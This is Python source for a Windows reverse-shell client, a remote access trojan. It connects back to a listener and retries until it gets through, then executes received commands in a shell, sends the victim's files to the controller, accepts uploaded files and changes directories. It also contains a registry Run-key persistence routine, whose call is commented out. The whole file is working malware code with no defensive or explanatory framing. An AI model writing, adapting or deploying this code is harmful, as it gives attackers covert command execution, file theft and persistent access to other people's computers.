import socket
import subprocess
import os
import shutil
import winreg as wreg
import sys
import random
import time

ip = '127.0.0.1'
port = 6666
current_working_directory = os.getcwd()
print(f"Initial Working Directory: {current_working_directory}") 

def ensure_persistence():
    destination_executable = os.path.join(os.environ['USERPROFILE'], 'Documents', "clienthai.exe")
    try:
        if not os.path.exists(destination_executable):
            shutil.copy(sys.executable, destination_executable)
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_SET_VALUE)
            wreg.SetValueEx(key, "MyRochak", 0, wreg.REG_SZ, destination_executable)
            wreg.CloseKey(key)
        print("Persistence ensured.")
    except Exception as e:
        print(f"Error ensuring persistence: {e}")

def attempt_connection():
    while True:
        try:
            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cs.connect((ip, port))
            print("Connected to server.")
            return cs
        except socket.error:
            print("Connection failed, retrying in a few seconds...")
            time.sleep(random.randint(5, 10))

def change_directory(client_socket, directory):
    global current_working_directory
    try:
        # Debug print to confirm the function is called once
        print(f"change_directory called with {directory}")

        # Determine the new directory path, whether absolute or relative
        new_dir = directory if os.path.isabs(directory) else os.path.join(current_working_directory, directory)
        new_dir = os.path.normpath(new_dir)

        # Check if the new directory is the same as the current to prevent loops
        if new_dir == current_working_directory:
            message = f"Already in {current_working_directory}"
            client_socket.send(message.encode())
            print(message)  # Debug print
            return

        # Change to the new directory if it's different
        os.chdir(new_dir)
        current_working_directory = os.getcwd()

        # Confirm the directory change to the client
        message = f"Changed directory to {current_working_directory}"
        client_socket.send(message.encode())
        print(message)  # Debug print for confirmation
    except Exception as e:
        error_message = f"Error changing directory: {e}"
        client_socket.send(error_message.encode())
        print(error_message)  # Debug print for error


def download_file(client_socket, filename):
    if os.path.isdir(filename):
        client_socket.send(b"Is a directory")
    elif not os.path.exists(filename):
        client_socket.send(b"File does not exist")
    else:
        try:
            file_size = os.path.getsize(filename)
            client_socket.send(str(file_size).encode())
            with open(filename, 'rb') as f:
                while True:
                    chunk = f.read(2048)
                    if not chunk:
                        break
                    client_socket.send(chunk)
        except Exception as e:
            error_message = f"Error sending file: {str(e)}"
            client_socket.send(error_message.encode())

def upload_file(client_socket, command_details):
    filename, file_size_str = command_details.split(' ', 1)
    file_size = int(file_size_str)
    if file_size > 0:
        client_socket.send(b"Ready for upload")
        received_size = 0
        with open(filename, 'wb') as f:
            while received_size < file_size:
                chunk = client_socket.recv(2048)
                f.write(chunk)
                received_size += len(chunk)
                if received_size >= file_size:
                    break
        client_socket.send(b"File Upload Successful.")
    else:
        client_socket.send(b"Error: File size is zero or undefined.")

def process_commands(client_socket):
    while True:
        try:
            command = client_socket.recv(2048).decode().strip()
            if not command:
                # No command received; skip this iteration
                continue

            if command == 'quit':
                print("Quitting...")
                client_socket.close()
                break

            print(f"Command received: {command}")  # Debug print for received command

            # Split the command to get the action and the optional directory
            command_parts = command.split(" ", 1)
            action = command_parts[0]

            if action == 'cd' and len(command_parts) > 1:
                change_directory(client_socket, command_parts[1])
            elif action == 'download' and len(command_parts) > 1:
                download_file(client_socket, command_parts[1])
            elif action == 'upload' and len(command_parts) > 1:
                upload_file(client_socket, command_parts[1])
            else:
                execute_other_commands(client_socket, command_parts)

        except ConnectionResetError:
            print("Connection closed by server. Reconnecting...")
            client_socket = attempt_connection()
        except Exception as e:
            print(f"Unexpected error: {e}")
            client_socket.close()
            break  # Exit the loop if an unexpected error occurs



def execute_other_commands(client_socket, msg_parts):
    try:
        p = subprocess.Popen(msg_parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = p.communicate()
        msg = output.decode() if output else error.decode()
        client_socket.send(msg.encode())
    except Exception as e:
        client_socket.send(f"Command execution error: {e}".encode())

if __name__ == "__main__":
    #ensure_persistence()
    cs = attempt_connection()
    cs.send(b'TEST CLIENT')
    process_commands(cs)
